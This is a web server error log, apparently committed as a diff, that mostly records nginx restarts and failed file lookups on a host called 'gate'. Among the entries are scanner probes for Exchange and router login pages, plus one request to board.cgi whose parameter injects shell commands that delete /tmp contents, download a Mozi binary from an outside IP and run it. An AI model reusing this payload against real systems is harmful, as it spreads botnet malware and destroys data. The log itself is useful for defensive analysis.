+2021/08/11 14:34:34 [notice] 25#25: exiting
+2021/08/11 14:34:34 [notice] 24#24: exit
+2021/08/11 14:34:34 [notice] 25#25: exit
+2021/08/11 14:34:34 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2021/08/11 14:34:34 [notice] 1#1: worker process 24 exited with code 0
+2021/08/11 14:34:34 [notice] 1#1: worker process 25 exited with code 0
+2021/08/11 14:34:34 [notice] 1#1: exit
+2021/08/11 14:34:52 [notice] 1#1: using the "epoll" event method
+2021/08/11 14:34:52 [notice] 1#1: nginx/1.21.1
+2021/08/11 14:34:52 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 14:34:52 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 14:34:52 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 14:34:52 [notice] 1#1: start worker processes
+2021/08/11 14:34:52 [notice] 1#1: start worker process 22
+2021/08/11 14:34:52 [notice] 1#1: start worker process 23
+2021/08/11 16:39:02 [error] 22#22: *90 open() "/var/www/gate/favicon.ico" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /favicon.ico HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 16:39:23 [error] 22#22: *97 open() "/var/www/gate/favicon.ico" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /favicon.ico HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 16:39:44 [error] 22#22: *104 open() "/var/www/gate/favicon.ico" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /favicon.ico HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 16:40:00 [error] 22#22: *111 open() "/var/www/gate/favicon.ico" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /favicon.ico HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 16:40:19 [error] 22#22: *118 open() "/var/www/gate/favicon.ico" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /favicon.ico HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 16:40:42 [error] 22#22: *125 open() "/var/www/gate/favicon.ico" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /favicon.ico HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 16:40:59 [error] 22#22: *132 open() "/var/www/gate/favicon.ico" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /favicon.ico HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 16:41:29 [error] 22#22: *139 open() "/var/www/gate/favicon.ico" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /favicon.ico HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 16:50:26 [error] 22#22: *142 open() "/var/www/gate/owa/auth/x.js" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /owa/auth/x.js HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 17:02:38 [error] 22#22: *143 open() "/var/www/gate/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 17:13:16 [error] 22#22: *144 open() "/var/www/gate/owa/auth/logon.aspx" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /owa/auth/logon.aspx HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 18:32:50 [error] 22#22: *153 open() "/var/www/gate/favicon.ico" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /favicon.ico HTTP/1.0", host: "127.0.0.1:8080", referrer: "http://cn-game.ru/favicon.ico"
+2021/08/11 18:32:50 [error] 22#22: *154 open() "/var/www/gate/robots.txt" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /robots.txt HTTP/1.0", host: "127.0.0.1:8080", referrer: "http://cn-game.ru/robots.txt"
+2021/08/11 18:36:02 [error] 22#22: *155 open() "/var/www/gate/actuator/health" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /actuator/health HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 19:42:52 [error] 22#22: *156 open() "/var/www/gate/board.cgi" failed (2: No such file or directory), client: 61.53.123.127, server: gate, request: "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://61.53.123.127:49048/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0"
+2021/08/11 21:00:55 [error] 22#22: *167 "/var/www/gate/solr/index.php" is not found (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /solr/ HTTP/1.0", host: "127.0.0.1:8080", referrer: "http://84.201.145.127/solr/#/"
+2021/08/11 22:21:18 [error] 22#22: *172 open() "/var/www/gate/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.43.209, server: gate, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "84.201.145.127:8080", referrer: "http://84.201.145.127:8080/admin/login.asp"
+2021/08/11 22:37:36 [error] 22#22: *177 open() "/var/www/gate/favicon.ico" failed (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /favicon.ico HTTP/1.0", host: "127.0.0.1:8080", referrer: "https://84.201.145.127/"
+2021/08/11 22:39:18 [error] 22#22: *226 open() "/var/www/gate/favicon.ico" failed (2: No such file or directory), client: 92.100.32.240, server: gate, request: "GET /favicon.ico HTTP/1.1", host: "84.201.145.127:8080", referrer: "http://84.201.145.127:8080/"
+2021/08/11 22:50:12 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 22:50:12 [notice] 23#23: gracefully shutting down
+2021/08/11 22:50:12 [notice] 22#22: gracefully shutting down
+2021/08/11 22:50:12 [notice] 23#23: exiting
+2021/08/11 22:50:12 [notice] 23#23: exit
+2021/08/11 22:50:12 [notice] 22#22: exiting
+2021/08/11 22:50:12 [notice] 22#22: exit
+2021/08/11 22:50:12 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/11 22:50:12 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 22:50:12 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/11 22:50:12 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2021/08/11 22:50:12 [notice] 1#1: worker process 22 exited with code 0
+2021/08/11 22:50:12 [notice] 1#1: exit
+2021/08/11 22:50:15 [notice] 1#1: using the "epoll" event method
+2021/08/11 22:50:15 [notice] 1#1: nginx/1.21.1
+2021/08/11 22:50:15 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 22:50:15 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 22:50:15 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 22:50:15 [notice] 1#1: start worker processes
+2021/08/11 22:50:15 [notice] 1#1: start worker process 23
+2021/08/11 22:50:15 [notice] 1#1: start worker process 24
+2021/08/11 22:56:30 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 22:56:30 [notice] 24#24: gracefully shutting down
+2021/08/11 22:56:30 [notice] 23#23: gracefully shutting down
+2021/08/11 22:56:30 [notice] 24#24: exiting
+2021/08/11 22:56:30 [notice] 23#23: exiting
+2021/08/11 22:56:30 [notice] 24#24: exit
+2021/08/11 22:56:30 [notice] 23#23: exit
+2021/08/11 22:56:30 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/11 22:56:30 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 22:56:30 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/11 22:56:30 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/11 22:56:30 [notice] 1#1: worker process 24 exited with code 0
+2021/08/11 22:56:30 [notice] 1#1: exit
+2021/08/11 22:56:33 [notice] 1#1: using the "epoll" event method
+2021/08/11 22:56:33 [notice] 1#1: nginx/1.21.1
+2021/08/11 22:56:33 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 22:56:33 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 22:56:33 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 22:56:33 [notice] 1#1: start worker processes
+2021/08/11 22:56:33 [notice] 1#1: start worker process 23
+2021/08/11 22:56:33 [notice] 1#1: start worker process 24
+2021/08/11 22:58:10 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 22:58:10 [notice] 24#24: gracefully shutting down
+2021/08/11 22:58:10 [notice] 23#23: gracefully shutting down
+2021/08/11 22:58:10 [notice] 24#24: exiting
+2021/08/11 22:58:10 [notice] 23#23: exiting
+2021/08/11 22:58:10 [notice] 24#24: exit
+2021/08/11 22:58:10 [notice] 23#23: exit
+2021/08/11 22:58:11 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/11 22:58:11 [notice] 1#1: worker process 24 exited with code 0
+2021/08/11 22:58:11 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/11 22:58:11 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/11 22:58:11 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 22:58:11 [notice] 1#1: exit
+2021/08/11 22:58:30 [notice] 1#1: using the "epoll" event method
+2021/08/11 22:58:30 [notice] 1#1: nginx/1.21.1
+2021/08/11 22:58:30 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 22:58:30 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 22:58:30 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 22:58:30 [notice] 1#1: start worker processes
+2021/08/11 22:58:30 [notice] 1#1: start worker process 22
+2021/08/11 22:58:30 [notice] 1#1: start worker process 23
+2021/08/11 23:03:01 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 23:03:01 [notice] 23#23: gracefully shutting down
+2021/08/11 23:03:01 [notice] 22#22: gracefully shutting down
+2021/08/11 23:03:01 [notice] 23#23: exiting
+2021/08/11 23:03:01 [notice] 22#22: exiting
+2021/08/11 23:03:01 [notice] 23#23: exit
+2021/08/11 23:03:01 [notice] 22#22: exit
+2021/08/11 23:03:01 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/11 23:03:01 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 23:03:01 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/11 23:03:01 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2021/08/11 23:03:01 [notice] 1#1: worker process 22 exited with code 0
+2021/08/11 23:03:01 [notice] 1#1: exit
+2021/08/11 23:03:22 [notice] 1#1: using the "epoll" event method
+2021/08/11 23:03:22 [notice] 1#1: nginx/1.21.1
+2021/08/11 23:03:22 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 23:03:22 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 23:03:22 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 23:03:22 [notice] 1#1: start worker processes
+2021/08/11 23:03:22 [notice] 1#1: start worker process 22
+2021/08/11 23:03:22 [notice] 1#1: start worker process 23
+2021/08/11 23:09:03 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 23:09:03 [notice] 22#22: gracefully shutting down
+2021/08/11 23:09:03 [notice] 22#22: exiting
+2021/08/11 23:09:03 [notice] 23#23: gracefully shutting down
+2021/08/11 23:09:03 [notice] 22#22: exit
+2021/08/11 23:09:03 [notice] 23#23: exiting
+2021/08/11 23:09:03 [notice] 23#23: exit
+2021/08/11 23:09:03 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2021/08/11 23:09:03 [notice] 1#1: worker process 22 exited with code 0
+2021/08/11 23:09:03 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/11 23:09:03 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/11 23:09:03 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 23:09:03 [notice] 1#1: exit
+2021/08/11 23:09:05 [notice] 1#1: using the "epoll" event method
+2021/08/11 23:09:05 [notice] 1#1: nginx/1.21.1
+2021/08/11 23:09:05 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 23:09:05 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 23:09:05 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 23:09:05 [notice] 1#1: start worker processes
+2021/08/11 23:09:05 [notice] 1#1: start worker process 23
+2021/08/11 23:09:05 [notice] 1#1: start worker process 24
+2021/08/11 23:11:25 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 23:11:25 [notice] 24#24: gracefully shutting down
+2021/08/11 23:11:25 [notice] 23#23: gracefully shutting down
+2021/08/11 23:11:25 [notice] 24#24: exiting
+2021/08/11 23:11:25 [notice] 23#23: exiting
+2021/08/11 23:11:25 [notice] 24#24: exit
+2021/08/11 23:11:25 [notice] 23#23: exit
+2021/08/11 23:11:25 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/11 23:11:25 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 23:11:25 [notice] 1#1: worker process 24 exited with code 0
+2021/08/11 23:11:25 [notice] 1#1: exit
+2021/08/11 23:11:48 [notice] 1#1: using the "epoll" event method
+2021/08/11 23:11:48 [notice] 1#1: nginx/1.21.1
+2021/08/11 23:11:48 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 23:11:48 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 23:11:48 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 23:11:48 [notice] 1#1: start worker processes
+2021/08/11 23:11:48 [notice] 1#1: start worker process 24
+2021/08/11 23:11:48 [notice] 1#1: start worker process 25
+2021/08/11 23:21:53 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 23:21:53 [notice] 24#24: gracefully shutting down
+2021/08/11 23:21:53 [notice] 24#24: exiting
+2021/08/11 23:21:53 [notice] 24#24: exit
+2021/08/11 23:21:53 [notice] 25#25: gracefully shutting down
+2021/08/11 23:21:53 [notice] 25#25: exiting
+2021/08/11 23:21:53 [notice] 25#25: exit
+2021/08/11 23:21:53 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2021/08/11 23:21:53 [notice] 1#1: worker process 25 exited with code 0
+2021/08/11 23:21:53 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/11 23:21:53 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/11 23:21:53 [notice] 1#1: worker process 24 exited with code 0
+2021/08/11 23:21:53 [notice] 1#1: exit
+2021/08/11 23:22:12 [notice] 1#1: using the "epoll" event method
+2021/08/11 23:22:12 [notice] 1#1: nginx/1.21.1
+2021/08/11 23:22:12 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 23:22:12 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 23:22:12 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 23:22:12 [notice] 1#1: start worker processes
+2021/08/11 23:22:12 [notice] 1#1: start worker process 23
+2021/08/11 23:22:12 [notice] 1#1: start worker process 24
+2021/08/12 00:08:43 [error] 23#23: *72 open() "/var/www/gate/ff" failed (2: No such file or directory), client: 92.100.32.240, server: gate, request: "GET /ff HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/12 00:38:17 [error] 23#23: *84 open() "/var/www/gate/33" failed (2: No such file or directory), client: 92.100.32.240, server: gate, request: "GET /33 HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/12 00:38:25 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/12 00:38:25 [notice] 23#23: gracefully shutting down
+2021/08/12 00:38:25 [notice] 24#24: gracefully shutting down
+2021/08/12 00:38:25 [notice] 24#24: exiting
+2021/08/12 00:38:25 [notice] 24#24: exit
+2021/08/12 00:38:25 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/12 00:38:25 [notice] 1#1: worker process 24 exited with code 0
+2021/08/12 00:38:25 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/12 00:38:58 [notice] 1#1: using the "epoll" event method
+2021/08/12 00:38:58 [notice] 1#1: nginx/1.21.1
+2021/08/12 00:38:58 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/12 00:38:58 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/12 00:38:58 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/12 00:38:58 [notice] 1#1: start worker processes
+2021/08/12 00:38:58 [notice] 1#1: start worker process 23
+2021/08/12 00:38:58 [notice] 1#1: start worker process 24
+2021/08/12 00:40:04 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/12 00:40:04 [notice] 23#23: gracefully shutting down
+2021/08/12 00:40:04 [notice] 23#23: exiting
+2021/08/12 00:40:04 [notice] 24#24: gracefully shutting down
+2021/08/12 00:40:04 [notice] 23#23: exit
+2021/08/12 00:40:04 [notice] 24#24: exiting
+2021/08/12 00:40:04 [notice] 24#24: exit
+2021/08/12 00:40:04 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/12 00:40:04 [notice] 1#1: worker process 23 exited with code 0
+2021/08/12 00:40:04 [notice] 1#1: worker process 24 exited with code 0
+2021/08/12 00:40:04 [notice] 1#1: exit
+2021/08/12 00:40:22 [notice] 1#1: using the "epoll" event method
+2021/08/12 00:40:22 [notice] 1#1: nginx/1.21.1
+2021/08/12 00:40:22 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/12 00:40:22 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/12 00:40:22 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/12 00:40:22 [notice] 1#1: start worker processes
+2021/08/12 00:40:22 [notice] 1#1: start worker process 24
+2021/08/12 00:40:22 [notice] 1#1: start worker process 25
+2021/08/12 00:42:05 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/12 00:42:05 [notice] 25#25: gracefully shutting down
+2021/08/12 00:42:05 [notice] 24#24: gracefully shutting down
+2021/08/12 00:42:05 [notice] 25#25: exiting
+2021/08/12 00:42:05 [notice] 24#24: exiting
+2021/08/12 00:42:05 [notice] 24#24: exit
+2021/08/12 00:42:05 [notice] 25#25: exit
+2021/08/12 00:42:05 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/12 00:42:05 [notice] 1#1: worker process 24 exited with code 0
+2021/08/12 00:42:05 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/12 00:42:05 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2021/08/12 00:42:05 [notice] 1#1: worker process 25 exited with code 0
+2021/08/12 00:42:05 [notice] 1#1: exit
+2021/08/12 00:42:22 [notice] 1#1: using the "epoll" event method
+2021/08/12 00:42:22 [notice] 1#1: nginx/1.21.1
+2021/08/12 00:42:22 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/12 00:42:22 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/12 00:42:22 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/12 00:42:22 [notice] 1#1: start worker processes
+2021/08/12 00:42:22 [notice] 1#1: start worker process 22
+2021/08/12 00:42:22 [notice] 1#1: start worker process 23
+2021/08/12 00:42:30 [error] 22#22: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 92.100.32.240, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.24.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 00:42:33 [error] 22#22: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 92.100.32.240, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.24.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 00:46:50 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/12 00:46:50 [notice] 22#22: gracefully shutting down
+2021/08/12 00:46:50 [notice] 22#22: exiting
+2021/08/12 00:46:50 [notice] 23#23: gracefully shutting down
+2021/08/12 00:46:50 [notice] 23#23: exiting
+2021/08/12 00:46:50 [notice] 22#22: exit
+2021/08/12 00:46:50 [notice] 23#23: exit
+2021/08/12 00:46:51 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2021/08/12 00:46:51 [notice] 1#1: worker process 22 exited with code 0
+2021/08/12 00:46:51 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/12 00:46:51 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/12 00:46:51 [notice] 1#1: worker process 23 exited with code 0
+2021/08/12 00:46:51 [notice] 1#1: exit
+2021/08/12 00:47:52 [notice] 1#1: using the "epoll" event method
+2021/08/12 00:47:52 [notice] 1#1: nginx/1.21.1
+2021/08/12 00:47:52 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/12 00:47:52 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/12 00:47:52 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/12 00:47:52 [notice] 1#1: start worker processes
+2021/08/12 00:47:52 [notice] 1#1: start worker process 25
+2021/08/12 00:47:52 [notice] 1#1: start worker process 26
+2021/08/12 00:57:41 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/12 00:57:41 [notice] 25#25: gracefully shutting down
+2021/08/12 00:57:41 [notice] 26#26: gracefully shutting down
+2021/08/12 00:57:41 [notice] 26#26: exiting
+2021/08/12 00:57:41 [notice] 26#26: exit
+2021/08/12 00:57:41 [notice] 1#1: signal 17 (SIGCHLD) received from 26
+2021/08/12 00:57:41 [notice] 1#1: worker process 26 exited with code 0
+2021/08/12 00:57:41 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/12 00:58:20 [notice] 1#1: using the "epoll" event method
+2021/08/12 00:58:20 [notice] 1#1: nginx/1.21.1
+2021/08/12 00:58:20 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/12 00:58:20 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/12 00:58:20 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/12 00:58:20 [notice] 1#1: start worker processes
+2021/08/12 00:58:20 [notice] 1#1: start worker process 23
+2021/08/12 00:58:20 [notice] 1#1: start worker process 24
+2021/08/12 00:58:54 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/12 00:58:54 [notice] 23#23: gracefully shutting down
+2021/08/12 00:58:54 [notice] 24#24: gracefully shutting down
+2021/08/12 00:58:54 [notice] 24#24: exiting
+2021/08/12 00:58:54 [notice] 24#24: exit
+2021/08/12 00:58:54 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/12 00:58:54 [notice] 1#1: worker process 24 exited with code 0
+2021/08/12 00:58:54 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/12 00:59:23 [notice] 1#1: using the "epoll" event method
+2021/08/12 00:59:23 [notice] 1#1: nginx/1.21.1
+2021/08/12 00:59:23 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/12 00:59:23 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/12 00:59:23 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/12 00:59:23 [notice] 1#1: start worker processes
+2021/08/12 00:59:23 [notice] 1#1: start worker process 22
+2021/08/12 00:59:23 [notice] 1#1: start worker process 23
+2021/08/12 01:33:07 [error] 22#22: *7 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 135.181.88.47, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 02:18:26 [error] 22#22: *10 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 46.174.191.29, server: gate, request: "GET / HTTP/1.0", upstream: "fastcgi://172.27.0.3:9000"
+2021/08/12 03:17:24 [error] 22#22: *12 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 209.141.43.209, server: gate, request: "POST /boaform/admin/formLogin HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080", referrer: "http://84.201.145.127:8080/admin/login.asp"
+2021/08/12 04:19:59 [error] 22#22: *15 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 154.39.254.8, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 04:20:05 [error] 22#22: *17 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 154.39.254.8, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 04:20:12 [error] 22#22: *19 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 154.39.254.8, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 04:20:18 [error] 22#22: *21 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 154.39.254.8, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 04:20:29 [error] 22#22: *23 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 154.39.254.8, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 04:20:57 [error] 22#22: *25 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 65.21.249.215, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 04:21:17 [error] 22#22: *27 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 154.39.254.8, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 04:31:38 [error] 22#22: *29 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 154.39.254.8, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 04:37:18 [error] 22#22: *31 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 154.39.254.8, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 04:37:32 [error] 22#22: *33 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 154.39.254.8, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 04:37:34 [error] 22#22: *35 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 154.39.254.8, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 04:37:38 [error] 22#22: *37 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 154.39.254.8, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 04:37:45 [error] 22#22: *39 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 154.39.254.8, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 04:38:22 [error] 22#22: *41 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 154.39.254.8, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 04:50:46 [error] 22#22: *43 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 154.39.254.8, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 05:14:51 [error] 22#22: *45 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 79.166.116.79, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 05:52:40 [error] 22#22: *47 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 183.136.226.2, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 07:02:14 [error] 22#22: *49 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 110.137.37.126, server: gate, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080"
+2021/08/12 07:37:10 [error] 22#22: *58 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 92.100.32.240, server: gate, request: "GET /favicon.ico HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "84.201.145.127:8080", referrer: "http://84.201.145.127:8080/index.php"
